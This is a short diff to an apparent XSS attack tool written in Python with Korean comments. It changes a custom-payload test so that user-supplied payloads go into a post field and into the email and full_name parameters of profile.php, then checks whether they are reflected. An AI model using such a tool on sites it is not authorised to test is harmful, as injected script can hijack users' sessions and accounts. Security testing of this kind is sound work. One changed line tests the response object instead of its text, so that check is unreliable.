@@ -576,7 +576,7 @@ class XSSAttackToolV3:
         """사용자 정의 페이로드 테스트"""
         print(f"\n{Fore.CYAN}[*] Custom Payload Test{Style.RESET_ALL}")
         
-        payload = input(f"{Fore.YELLOW}Enter your payload: {Style.RESET_ALL}")
+        payload = input(f"{Fore.YELLOW}Enter your payload in new_post: {Style.RESET_ALL}")
         
         if not payload:
             print(f"{Fore.RED}[-] No payload entered{Style.RESET_ALL}")
@@ -598,12 +598,14 @@ class XSSAttackToolV3:
             print(f"{Fore.GREEN}[+] Payload accepted{Style.RESET_ALL}")
             
             # GET 테스트도 해보기
-            test_url = f"{self.target_url}/search.php?q={payload}"
+            payload2 = input(f"{Fore.YELLOW}Enter your payload in profile email: {Style.RESET_ALL}")
+            payload3 = input(f"{Fore.YELLOW}Enter your payload in profile full_name: {Style.RESET_ALL}")
+            test_url = f"{self.target_url}/profile.php?email={payload2}&full_name={payload3}"
             print(f"\n{Fore.YELLOW}Also testing GET:{Style.RESET_ALL} {test_url[:100]}...")
             
             get_response = self.session.get(test_url)
-            if payload in get_response.text:
-                print(f"{Fore.GREEN}[+] GET XSS successful!{Style.RESET_ALL}")
+            if payload2 in get_response.text or payload3 in get_response:
+                print(f"{Fore.GREEN}[+] GET Profile successfully changed!{Style.RESET_ALL}")
 
     def reflected_xss_scanner(self):
         """반사형 XSS 스캐너"""
